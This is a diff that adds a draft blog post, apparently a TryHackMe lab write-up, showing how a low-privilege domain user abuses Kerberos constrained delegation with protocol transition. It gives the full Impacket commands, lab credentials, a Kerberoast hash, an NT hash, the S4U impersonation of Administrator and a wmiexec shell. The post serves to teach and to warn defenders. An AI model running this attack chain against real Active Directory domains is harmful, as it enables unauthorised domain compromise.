@@ -1,0 +1,153 @@
+---
+date: '2026-06-07T12:00:38+06:00'
+draft: true
+title: 'Abusing Constrained Delegation Without Local Admin'
+comments:
+  enabled: true
+  system: "giscus"
+---
+
+There is a persistent misconception in Active Directory penetration testing to pull off a Constrained Delegation attack, you need to compromise a host, escalate to local administrator, and dump credentials from memory.
+
+While dumping LSASS is a standard path it is not a strict requirement. If the target is a user account configured with a weak password, a standard domain user can execute a complete delegation attack and achieve Domain Administrator impersonation entirely over the network, without ever touching a target endpoint's disk or needing elevated privileges.
+
+Here is an analytical breakdown of how the intersection of Kerberoasting and Protocol Transition allows for zero-admin domain compromise, focusing on the underlying mechanics of the Kerberos S4U extensions.
+
+
+
+
+
+
+
+## Phase 1: Identifying the Misconfiguration (Zero-Touch Enumeration)
+
+The attack begins from the perspective of a standard, unprivileged domain user. The objective is to query Active Directory via LDAP for accounts configured with Constrained Delegation.
+
+Looking at standard LDAP enumeration output via Impacket:
+
+```bash
+impacket-findDelegation 'za.tryhackme.loc/t2_leon.francis:Password!1' -dc-ip 10.200.72.101
+```
+
+
+```bash
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+AccountName  AccountType  DelegationType                      DelegationRightsTo                 SPN Exists 
+-----------  -----------  ----------------------------------  ---------------------------------  ----------
+THMDC$       Computer     Unconstrained                       N/A                                Yes        
+svcIIS       Person       Constrained w/ Protocol Transition  WSMAN/THMSERVER1.za.tryhackme.loc  Yes        
+svcIIS       Person       Constrained w/ Protocol Transition  WSMAN/THMSERVER1                   Yes        
+svcIIS       Person       Constrained w/ Protocol Transition  http/THMSERVER1.za.tryhackme.loc   No         
+svcIIS       Person       Constrained w/ Protocol Transition  http/THMSERVER1                    No         
+
+```
+
+**The Mechanics:**
+
+The critical element here is `Constrained w/ Protocol Transition`. In Active Directory, this correlates to the `TRUSTED_TO_AUTH_FOR_DELEGATION` (T2A4D) user account control flag.
+
+When a service account holds this flag, it is permitted to utilize the **S4U2Self** Kerberos extension. This means the `svcIIS` account can request a service ticket to itself on behalf of _any_ other user in the domain, without requiring that user to supply a password. The `DelegationRightsTo` column dictates where that ticket can subsequently be forwarded.
+
+Because `svcIIS` is marked as a `Person` (a User account, not a Machine account), it is highly likely to have a Service Principal Name (SPN) attached, making it a viable target for offline attacks.
+
+## Phase 2: The Silent Extraction (Kerberoasting)
+
+If `svcIIS` was a Machine Account or a Group Managed Service Account (gMSA), the attack would require local administrator rights to extract the 120-character rotating password from memory. However, because it is a standard user account, the Kerberos protocol allows any authenticated user to request a Ticket Granting Service (TGS) ticket for it.
+
+```bash
+impacket-GetUserSPNs 'za.tryhackme.loc/t2_leon.francis:Password!1' -dc-ip 10.200.72.101 -request-user svcIIS -outputfile svciis_hash.txt
+```
+
+```bash
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+ServicePrincipalName              Name    MemberOf  PasswordLastSet             LastLogon                   Delegation  
+--------------------------------  ------  --------  --------------------------  --------------------------  -----------
+HTTP/svcServWeb.za.tryhackme.loc  svcIIS            2022-04-29 06:50:25.152583  2026-06-06 02:39:59.678483  constrained 
+
+```
+
+```bash
+cat svciis_hash.txt 
+```
+
+```bash
+$krb5tgs$23$*svcIIS$ZA.TRYHACKME.LOC$za.tryhackme.loc/svcIIS*$7a12eb6bc2931fcdce8642b84802abf3$de111089e45e098cae387582a264b65134254d525944fad820e2fa158049f95997a8e433152464da942d3fe8732aee21a026fa9bb6c5b921024a9afa21fe9996142b131e0fda7e363be164c241a1ccf22f896275c5336fa28efb1c56fcfbb573a172eff6f696092b9246e62265c69436fa0fb05b3b3eb85554238b793803ad4f20bb43d852617c3bbbecfa882b681b55c2799bc8f0d0fd20b42f909c07f0daa10330c70986c28d9fe805bbc4658e0c91bf3d018580c383090f6b2c261780c66981b122692341e941bed71523cef3e45f80ae021eaa0401505ff9953b577e8d80d639e6dd311bbda0f4663835954a0177076afd4dd28413840786f0978fc346e9b2a9582fcd4ba063b1aea416d7c24ea16c001c282cde5dc6e595674c94a7f909097c777b26cbcccdf08631a041d2133d7f7ad0251869271162e2fbcf297b889c3962fe79c773b855f33ddfebe2f0f8fb1c2db1dd953265fb053593ca86f8cfc7286d0209c5817ebf07dbaec3cc729c60aa157385caa6d43e6d05b202044c9dfab264c2e31417de824d6df97b0151416daed3019c9f14dd720283046615adfb09033d664603170317b8bc441b745e06fc50ca4dca29d795a6adafbcc8e76892854cd8a6f9e6e7d0e3289f96825537ca4f2816fe0760bfc519bcc4a8e75c746e70437233da7ee2c2eaf4c029ba52db618e83894a043e3bd0e879e01fc331fec4aa0f94b60dcc9c8dc9687b8e6d3844928a1972afe26a2a365047c164663689da81ec49dedb8c78cdffd8ae8db066d616890808d6de02f65914d4476235654684b1d62bedf952ad217ca34271115b30254df47272b8601f420de177dfaa569f9b22aa597616a94a25c8e7e43c02a9b6f2c715ddbc80254c7fd6bea60a8b96aa897596709d2bafb476a90aa4a5e3899ecdbabc5bf2419ca819973c5f6d84a0b64c712b0236c63bcdc8e55e3431f0a1763065f4ad8932376be754c6fcaf07e0318cbcaf0974e81ce4015e230a37bca6e0479440349afba0f0cd95f19eae02c40bbffdb48aff8c0501a787f11447a1b7350b4246b2aa27ee146de7e2c7386b82a52fa0f4631a05d14f47c12df65a7aff10d1a73c1856e729672771b502e591cf22334132f037a91cdb3aabccb28b86d844fe65f9fa482b7cd58912ede84524284ea930b3e976a4c4e00294d4c564f6e7acdc4d461e7e4d084e44f01e242aad481ba591381dd5ac767d236c5fc836695df90bb7f6d2db3fc7a2970218ed765e0fecf4f7fb6b71b6bd1ccf1ed2ba83c7b5e07cf2cbb7168ab4f837241dcb841f7cf64253684cd82b3ab6e2d54db8843149eaee768198aca08c4f91229a26cd5682ea1b5e774e0b62fa4931a47a2e7623471b83d2453608741e848812316a01df8e749789dec723b9e9083e1c
+
+```
+
+**The Mechanics:**
+
+The Domain Controller returns a TGS encrypted with the RC4-HMAC hash of the `svcIIS` account's password. The attacker now possesses the cryptographic material required to authenticate as `svcIIS`. By taking this hash offline and cracking it (revealing `Password1@`), the attacker gains full control of the service account without ever executing code on the IIS server itself.
+
+## Phase 3: Forging the VIP Pass (S4U2Self & S4U2Proxy)
+
+This is where the zero-admin narrative crystallizes. With the plaintext password recovered, the attacker derives the NT Hash (`43460d636f269c709b20049cee36ae7a`) and initiates the protocol abuse.
+
+
+```bash
+impacket-getST za.tryhackme.loc/svcIIS -hashes :43460d636f269c709b20049cee36ae7a -spn wsman/THMSERVER1.za.tryhackme.loc -impersonate Administrator -k
+
+```
+
+```bash
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@wsman_THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.ccache
+
+```
+
+
+**The Mechanics:**
+
+This single command executes the core of the Constrained Delegation attack entirely over the network:
+
+1. **S4U2Self:** The attacker authenticates as `svcIIS` and requests a ticket to itself on behalf of the `Administrator` account. Because `svcIIS` has Protocol Transition enabled, the Domain Controller obliges and issues a forwardable ticket.
+    
+2. **S4U2Proxy:** The attacker immediately takes that forwardable ticket and presents it back to the Domain Controller, requesting access to the downstream service defined in the LDAP enumeration (`wsman/THMSERVER1`).
+    
+3. **The Result:** The DC issues a valid Kerberos Service Ticket proving the attacker is the Domain `Administrator` for that specific service.
+    
+
+At no point was the `Administrator` password guessed, nor was an elevated session required.
+
+## Phase 4: Realistic Impact Execution
+
+With the forged ticket exported to the local credential cache, the attacker can leverage native remote administration protocols like WMI (Windows Management Instrumentation) or WinRM to interact with the target server.
+
+
+```bash
+export KRB5CCNAME=Administrator@wsman_THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.ccache
+
+```
+
+```bash
+impacket-wmiexec -k -no-pass za.tryhackme.loc/Administrator@THMSERVER1.za.tryhackme.loc
+```
+
+```bash
+za.tryhackme.loc/Administrator@THMSERVER1.za.tryhackme.loc
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>whoami
+za\administrator
+
+C:\>
+
+```
+
+
+**The Impact:**
+
+By evaluating the data integrity of this attack path, the severity becomes clear. A low-privilege attacker leveraged a standard protocol feature to bypass security boundaries, resulting in an interactive `administrator` level shell on a sensitive server.
+
+Relying on the assumption that attackers must first compromise endpoints to abuse delegation creates a dangerous blind spot. As long as Protocol Transition is paired with crackable passwords, the network is vulnerable to remote, unprivileged domain compromise.
